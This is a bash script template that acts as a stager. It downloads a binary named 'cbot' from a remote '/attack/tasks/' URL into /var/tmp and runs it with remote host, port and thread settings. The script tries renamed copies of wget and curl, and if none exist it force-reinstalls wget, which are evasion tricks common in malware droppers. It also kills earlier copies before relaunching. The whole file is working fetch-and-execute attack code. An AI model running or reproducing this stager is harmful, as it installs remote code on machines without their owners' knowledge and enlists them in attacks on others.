#!/usr/bin/env bash

download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/cbot_linux"
pnodeId=$1

function download() {

  if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
    wget -c $download_cbot_uri -O /var/tmp/cbot
  elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs $download_cbot_uri -o /var/tmp/cbot
  elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   wge -c $download_cbot_uri -O /var/tmp/cbot
  elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c $download_cbot_uri -O /var/tmp/cbot
  elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs $download_cbot_uri -o /var/tmp/cbot
  elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs $download_cbot_uri -o /var/tmp/cbot
  else
   rpm -e --nodeps wget
   yum -y install wget
   apt-get -y install wget

   wget -c $download_cbot_uri -O /var/tmp/cbot
  fi

}

function run_cbot() {

    chmod a+x /var/tmp/cbot
    /var/tmp/cbot -pnode $pnodeId -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
}

download

if [ -f /var/tmp/cbot ]; then

  pkill -f cbot

  run_cbot

fi







